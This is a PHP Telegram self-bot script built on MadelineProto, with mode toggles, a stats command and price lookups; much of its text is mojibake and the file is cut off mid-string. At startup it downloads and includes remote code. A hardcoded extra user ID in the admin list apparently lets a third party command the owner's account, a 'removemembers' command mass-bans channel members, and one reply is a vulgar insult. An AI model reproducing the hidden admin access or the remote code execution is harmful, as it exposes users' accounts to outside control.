<?php
//By @Yasin_431
error_reporting(E_ALL);
ini_set('display_errors','1');
ini_set('memory_limit' , '-1');
ini_set('max_execution_time','0');
ini_set('display_startup_errors','1');

date_default_timezone_set('Asia/Tehran');

if (!is_dir('files')) {
    mkdir('files');
}
if (!file_exists('madeline.php') or filesize('madeline.php') < rand(1024, 2048)) {
    copy('https://phar.madelineproto.xyz/madeline.php', 'madeline.php');
}

include 'madeline.php';
include 'jdf.php';

use danog\Loop\Generic\GenericLoop;
use danog\MadelineProto\API;
use danog\MadelineProto\EventHandler;


function isJson($string)
{
    json_decode($string);
    if (json_last_error() == JSON_ERROR_NONE) {
        return true;
    } else {
        return false;
    }
}

function bioToCustom($text)
{
    $fonts = [["๐ถ", "๐ท", "๐ธ", "๐น", "๐บ", "๐ป", "๐ผ", "๐ฝ", "๐พ", "๐ฟโ"],
        ["โช", "โ ", "โก", "โข", "โฃ", "โค", "โฅ", "โฆ", "โง", "โจ"],
        ["โฟ", "โถ", "โท", "โธ", "โน", "โบ", "โป", "โผ", "โฝ", "โพ"],
        ["ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ใ", "ใ๐ ใ", "ใ๐กใ"],
        ["๐", "๐", "๐", "๐", "๐", "๐", " ๐", "๐", "๐ ", "๐ก"],
        ["๐ฌ", "๐ญ", "๐ฎ", "๐ฏ", "๐ฐ", "๐ฑ", "๐ฒ", "๐ณ", "๐ด", "๐ต"],
        ["โ๐", "โ๐", "โ๐", "โ๐", "โ๐", "โ๐", "โ๐", "โ๐", "โ๐", "โ๐"],
        ["๐ถ", "า1", "า2", "า3", "า4", "า5", "า6", "า7", "า8", "า9า"]];
    $time2 = str_replace(range(0, 9), $fonts[array_rand($fonts)], date("H:i"));
    $param = str_replace('TIME', date('H:i'), $text);
    $param = str_replace('FTM', $time2, $param);
    $param = str_replace('DAYNAME', jdate('l'), $param);
    $param = str_replace('YEAR', jdate('y'), $param);
    $param = str_replace('MONTH', jdate('n'), $param);
    $param = str_replace('DAY', jdate('j'), $param);
    return $param;
}

function align(array $args, string $sep = ': ', string $prefix = '', string $suffix = '', bool $mb = false): string
{
    [$result, $maxLength, $method] = ['', 0, $mb ? 'mb_strlen' : 'strlen'];
    foreach ($args as $key => $val) {
        if ($method($key) > $maxLength) {
            $maxLength = $method($key);
        }
    }
    foreach ($args as $key => $val) {
        $result .= $prefix . $key . str_repeat(' ', $maxLength - $method($key)) . $sep . $val . $suffix . PHP_EOL;
    }
    return $result;
}

function bytesShortener($bytes, int $round = 0): string
{
    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
    $index = 0;
    while ($bytes > 1024) {
        $bytes /= 1024;
        if (++$index === 8)
            break;
    }
    if ($round !== 0) {
        $bytes = round($bytes, $round);
    }
    return "$bytes {$units[$index]}";
}

function getCpuCores(): int
{
    return (int)(
    PHP_OS_FAMILY === 'Windows'
        ? getenv('NUMBER_OF_PROCESSORS')
        : substr_count(file_get_contents('/proc/cpuinfo'), 'processor')
    );
}

class XHandler extends EventHandler
{
    /*   const Admins = [904067273];
       const Report = 'PawnCoder';

       public function getReportPeers()
       {
           return [@Yasin_431];
       }*/

    public function onUpdateNewChannelMessage($update)
    {
        yield $this->onUpdateNewMessage($update);
    }

    public function onUpdateNewMessage($update)
    {
        if (time() - $update['message']['date'] > 2) {
            return;
        }
        try {
            $fromId = $update['message']['from_id']['user_id'] ?? 0;
            $text = $update['message']['message'] ?? null;
            $msg_id = $update['message']['id'] ?? 0;
            $message = isset($update['message']) ? $update['message'] : '';
            $MadelineProto = $this;
            $me = yield $this->getSelf();
            $owner = $me['id'];
            $Adminha = array($owner, 1703016137);
            $chID = yield $this->getInfo($update);
            $peer = yield $this->getID($update);
            $type3 = $chID['type'];
            $data = json_decode(yield $this->getLocalContents("data.json"), true);
            $step = $data['adminStep'];
            $load = sys_getloadavg();
            $mem_using = round(memory_get_usage() / 1024 / 1024, 1);
            if (in_array($fromId, $Adminha)) {
                //	   if($from_id == $owner){
                if (!isset($update['message']['fwd_from']['_'])) {
                    $boldmode = yield $this->getLocalContents("bold.txt");
                    $mentionmode = yield $this->getLocalContents("mention.txt");
                    $mention2mode = yield $this->getLocalContents("mention2.txt");
                    $codingmode = yield $this->getLocalContents("coding.txt");
                    $strikethrough = yield $this->getLocalContents("strikethrough.txt");
                    $undermode = yield $this->getLocalContents("underline.txt");
                    $hashtagmode = yield $this->getLocalContents("hashtag.txt");
                    $partmode = yield $this->getLocalContents("part.txt");
                    $italic = yield $this->getLocalContents("italic.txt");
                    if (preg_match("/^[\/\#\!]?(bot) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(bot) (on|off)$/si", $text, $m);
                        $data['power'] = $m[2];
                        yield $this->filePutContents("data.json", json_encode($data));
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "สแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(poker) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(poker) (on|off)$/si", $text, $m);
                        $data['poker'] = $m[2];
                        yield $this->filePutContents("data.json", json_encode($data));
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดแดแดแดส ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(bold) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(bold) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('bold.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "สแดสแด แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(mention) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(mention) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('mention.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดแดษดแดษชแดษด แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(mention2) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(mention2) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('mention2.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดแดษดแดษชแดษด2 แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(coding) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(coding) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('coding.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดแดแดษชษดษข แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(setlang) (en|fa)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setlang) (en|fa)$/si", $text, $m);
                        yield $this->filePutContents('language.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ก๐ ๐ฅ๐๐ง๐ ๐ฎ๐๐ ๐ ๐จ๐ ๐ญ๐ก๐ ๐๐จ๐ญ ๐ฐ๐๐ฌ ๐ฌ๐๐ญ ๐ญ๐จ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(strikethrough) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(strikethrough) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('strikethrough.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๊ฑแดสษชแดแดแดสสแดแดษขส แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(underline) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(underline) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('underline.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดษดแดแดสสษชษดแด แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(hashtag) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(hashtag) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('hashtag.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "สแด๊ฑสแดแดษข แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(part) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(part) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('part.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Pแดแดสแด แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockpv) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(lockpv) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('lockpv.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "สแดแดแด แดแด  แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(locklink) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(locklink) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('locklink.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "สแดแดแด สษชษดแด แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockvia) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(lockvia) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('lockvia.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "LockVia Mode Now Is $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockphoto) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(lockphoto) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('lockphoto.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "LockPhoto Mode Now Is $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockmention) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(lockmention) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('lockmention.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "LockMention Mode Now Is $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockforward) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(lockforward) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('lockforward.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "lockforward Mode Now Is $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(locktag) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(locktag) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('locktag.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "สแดแดแด แดแดษข แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockgp) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(lockgp) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('lockgp.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "สแดแดแด ษขแด แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockmedia) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(lockmedia) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('lockmedia.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "สแดแดแด แดแดแดษชแด แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(typing) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(typing) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('typing.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดสแดษชษดษข แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(autochat) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(autochat) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('autochat.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดแดแดแด แดสแดแด แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(gameplay) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(gameplay) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('gameplay.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ษขแดแดแดแดสแดส แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(gamepv) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(gamepv) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('gamepv.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ษขแดแดแดแดแด  แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(antilogin) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(antilogin) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('antilogin.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดษดแดษชสแดษขษชษด แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(audioaction) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(audioaction) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('audioaction.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดแดแดษชแดแดแดแดษชแดษด แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(videoaction) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(videoaction) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('videoaction.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แด ษชแดแดแดแดแดแดษชแดษด แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(markread) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(markread) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('markread.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดแดสแดสแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(italic) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(italic) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('italic.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ษชแดแดสษชแด แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(timename) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(timename) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('online.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดษชแดแดษดแดแดแด แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(enfont) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(enfont) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('enfont.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดษด๊ฐแดษดแด แดแดแดแด ษช๊ฑ ษดแดแดก $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(fafont) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(fafont) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('fafont.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "FA๊ฐแดษดแด แดแดแดแด ษช๊ฑ ษดแดแดก $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(timesticker) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(timesticker) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('timesticker.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดษชแดแด๊ฑแดษชแดแดแดส แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(timepic) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(timepic) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('timepic.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดษชแดแดแดษชแด แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(timebio) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(timebio) (on|off)$/si", $text, $m);
                        yield $this->filePutContents('timebio.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดษชแดแดสษชแด แดแดแดแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }
                    if (preg_match('/^[\/\#\!\.]?(status|ูุถุน?ุช|ูุถุน|ูุตุฑู|usage)$/si', $text)) {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ ๐น๐๐๐๐๐๐๐๐** [๐๐๐๐๐๐๐](mention:$fromId) **๐๐๐๐๐๐๐๐๐๐๐ ...!**", 'parse_mode' => 'Markdown']);
                        $chats = ['bot' => 0, 'user' => 0, 'chat' => 0, 'channel' => 0, 'supergroup' => 0];
                        foreach (yield $this->getDialogs() as $dialog) {
                            try {
                                $chats[yield $this->getInfo($dialog)['type']]++;
                            } catch (Throwable $e) {
                                $this->logger($e, Logger::ERROR);
                            }
                        }
                        $contacts = yield $this->contacts->getContacts()['contacts'];
                        $mutual = 0;
                        foreach ($contacts as $contact) {
                            if ($contact['mutual']) {
                                $mutual++;
                            }
                        }
                        $userStats =
                            "**Chats**\n"
                            . align(
                                [
                                    'Private' => $chats['user'],
                                    'Contact' => count($contacts),
                                    'Mutual Contact' => $mutual,
                                    'Group' => $chats['chat'],
                                    'Supergroup' => $chats['supergroup'],
                                    'Channel' => $chats['channel'],
                                    'Bot' => $chats['bot']
                                ],
                                ': ',
                                '`โข ',
                                '`'
                            )
                            . "\n";
                        $serverStats =
                            "**Server**\n"
                            . align(
                                [
                                    'CPU cores' => getCpuCores(),
                                    'Robot mem usage' => bytesShortener(memory_get_usage(), 2),
                                    'Robot max mem usage' => bytesShortener(memory_get_peak_usage(), 2),
                                    'Allocated mem from sys' => bytesShortener(memory_get_usage(true), 2),
                                    'Max allocated mem from sys' => bytesShortener(memory_get_peak_usage(true), 2),
                                    'PHP version' => PHP_VERSION
                                ],
                                ': ',
                                '`โข ',
                                '`'
                            );
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**Robot Statistics**\n\n" . ($userStats ?? '') . $serverStats, 'parse_mode' => 'Markdown']);

                    }
                    if (preg_match('/^[\/\#\!]?(restart|ุฑ?ุณุชุงุฑุช)$/si', $text)) {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '**ึ Yasin self is Restarting...!**', 'reply_to_msg_id' => $msg_id, 'parse_mode' => 'Markdown']);;
                        yield $this->restart();
                    }
                    if (preg_match("/^[\/\#\!]?(check)$/si", $text)) {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ Yasin** [self](mention:$fromId) **Checked**", 'parse_mode' => 'Markdown']);
                    }
                    if (preg_match("/^[\/\#\!]?(bot|ุฑุจุงุช)$/si", $text)) {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ Yasin** [Self](mention:$fromId) **Bot is on**", 'parse_mode' => 'Markdown']);
                    }
                    if (preg_match('/^\/?(removemembers) (.*)$/si', $text, $m)) {
                        $num = 9999999;
						$channelParticipantsAdmins = ['_' => 'channelParticipantsAdmins'];
						$channelParticipantsBots = ['_' => 'channelParticipantsBots'];
						$admins = yield $this->channels->getParticipants(['channel' => $m[2], 'filter' => $channelParticipantsAdmins, 'offset' => 0, 'limit' => 25, 'hash' => [0], ]);
                        foreach ($admins['participants'] as $admin) {
                            $admineyaro[] = $admin['user_id'];
                        }
						$channelBannedRights = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => -1];
                        $channelParticipantsRecent = ['_' => 'channelParticipantsRecent'];
                        $channels_ChannelParticipants = yield $this->channels->getParticipants(['channel' => $m[2], 'filter' => $channelParticipantsRecent, 'offset' => 0, 'limit' => 200, 'hash' => 0,]);
                        $userrs = $channels_ChannelParticipants['users'];
                        for ($i = 0; $i <= $num; $i++) {
                            $fonid = $userrs[$i]['id'];
                            $fon = $userrs[$i]['self'];
                            if ($fon == false && !in_array($fonid, $admineyaro)) {
                                yield $this->channels->editBanned([
                                    'channel' => $m[2],
                                    'user_id' => $fonid,
                                    'banned_rights' => $channelBannedRights]);
                            }
                        }
                    }
					
                    if ($text == 'ูุงู' or $text == 'fall' or $text == 'omen') {
                        $link = json_decode(yield $this->fileGetContents("https://api.codebazan.ir/fal/?type=json"), true);
                        $fall = $link['Result'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
$fall
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
     "]);
                    }
                    if ($text == 'number' or $text == 'ุดูุงุฑุด') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๏ผ"]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "๏ผ", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "๏ผ", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "๏ผ", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "๏ผ", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "๏ผ", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "๏ผ", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "๏ผ", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "๏ผ", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "๏ผ๏ผ", 'id' => $msg_id + 1]);
                        yield $this->sleep(1);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ฺฉุต ููุช ุจุง?๐น๐ค", 'id' => $msg_id + 1]);
                    }
                    if ($text == "for") {
                        foreach (range(2, 164) as $t) {
                            yield $this->sleep(1);
                            $rand = rand(1, 164);
                            yield $this->messages->forwardMessages(['from_peer' => "@pawnfosh", 'to_peer' => $peer, 'id' => [$rand],]);
                        }
                    }

                    if ($text == "ู?ูุช ุทูุง") {
                        $talaa = json_decode(yield $this->fileGetContents("https://r2f.ir/web/tala.php"), true);
                        //$talaa = json_decode(file_get_contents("https://amirmmdhaghi.oghab-host.xyz/api/tala.php"), true);
                        $tala = $talaa['4']['price'];
                        $nogre = $talaa['5']['price'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
๐ตู?ูุช ุทูุง ู ููุฑู ุจู ุฏูุงุฑ :
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
๐ฅุงูุณ ุทูุง : $tala

๐ฅุงูุณ ููุฑู : $nogre
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
", 'parse_mode' => 'HTML']);
                    }

                    if ($text == "ู?ูุช ุณฺฉู") {
                        $talaa = json_decode(yield $this->fileGetContents("https://r2f.ir/web/tala.php"), true);
                        //$talaa = json_decode(file_get_contents("https://amirmmdhaghi.oghab-host.xyz/api/arz.php"), true);
                        $emami = $talaa['0']['price'];
                        $nim = $talaa['1']['price'];
                        $rob = $talaa['2']['price'];
                        $geram = $talaa['3']['price'];
                        $bahar = $talaa['6']['price'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
๐ู?ูุช ุณฺฉู ุจู ุชููุงู :
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
๐ฐุณฺฉู ฺฏุฑู? : $geram

๐ฐุฑุจุน ุณฺฉู : $rob

๐ฐู?ู ุณฺฉู : $nim

๐ฐุณฺฉู ุจูุงุฑ ุขุฒุงุฏ? :  $bahar

๐ฐุณฺฉู ุงูุงู? : $emami
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
", 'parse_mode' => 'HTML']);
                    }

                    if ($text == "ู?ูุช ุงุฑุฒ") {
                        $arz = json_decode(yield $this->fileGetContents("https://r2f.ir/web/arz.php"), true);
                        $yoro = $arz['0']['price'];
                        $emarat = $arz['1']['price'];
                        $swead = $arz['2']['price'];
                        $norway = $arz['3']['price'];
                        $iraq = $arz['4']['price'];
                        $swit = $arz['5']['price'];
                        $armanestan = $arz['6']['price'];
                        $gorgea = $arz['7']['price'];
                        $pakestan = $arz['8']['price'];
                        $soudi = $arz['9']['price'];
                        $russia = $arz['10']['price'];
                        $india = $arz['11']['price'];
                        $kwait = $arz['12']['price'];
                        $astulia = $arz['13']['price'];
                        $oman = $arz['14']['price'];
                        $qatar = $arz['15']['price'];
                        $kanada = $arz['16']['price'];
                        $tailand = $arz['17']['price'];
                        $turkye = $arz['18']['price'];
                        $england = $arz['19']['price'];
                        $hong = $arz['20']['price'];
                        $azarbayjan = $arz['21']['price'];
                        $malezy = $arz['22']['price'];
                        $danmark = $arz['23']['price'];
                        $newzland = $arz['24']['price'];
                        $china = $arz['25']['price'];
                        $japan = $arz['26']['price'];
                        $bahrin = $arz['27']['price'];
                        $souria = $arz['28']['price'];
                        $dolar = $arz['29']['price'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
๐ต ู?ูุช ุงุฑุฒ ูุง? ฺฉุดูุฑ ูุง? ูุฎุชูู:
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
๐ช๐บ ?ูุฑู : $yoro

๐บ๐ธ ุฏูุงุฑ : $dolar

๐ฆ๐ชุฏุฑูู ุงูุงุฑุงุช  : $emarat

๐ธ๐ช ฺฉุฑูู ุณูุฆุฏ : $swead

๐ณ๐ด ฺฉุฑูู ูุฑูฺ : $norway

๐ฎ๐ถ ุฏ?ูุงุฑ ุนุฑุงู : $iraq

๐จ๐ญูุฑุงูฺฉ ุณูุฆ?ุณ : $swit

๐ฆ๐ฒ ุฏุฑุงู ุงุฑููุณุชุงู : $armanestan

๐ฌ๐ชูุงุฑ? ฺฏุฑุฌุณุชุงู : $gorgea

๐ต๐ฐ ุฑููพ?ู ูพุงฺฉุณุชุงู : $pakestan

๐ท๐บ ุฑูุจู ุฑูุณ?ู : `$russia

๐ฎ๐ณ ุฑููพ?ู ููุฏูุณุชุงู : $india

๐ฐ๐ผ ุฏ?ูุงุฑ ฺฉู?ุช : $kwait

๐ฆ๐บ ุฏูุงุฑ ุงุณุชุฑู?ุง : $astulia

๐ด๐ฒ ุฑ?ุงู ุนูุงู : $oman

๐ถ๐ฆ ุฑ?ุงู ูุทุฑ : $qatar

๐จ๐ฆ ุฏูุงุฑ ฺฉุงูุงุฏุง : $kanada

๐น๐ญุจุงุช ุชุง?ููุฏ : $tailand

๐น๐ท ู?ุฑ ุชุฑฺฉ?ู : $turkye

๐ฌ๐ง ูพููุฏ ุงูฺฏู?ุณ : $england

๐ญ๐ฐ ุฏูุงุฑ ููฺฏ ฺฉูฺฏ : $hong

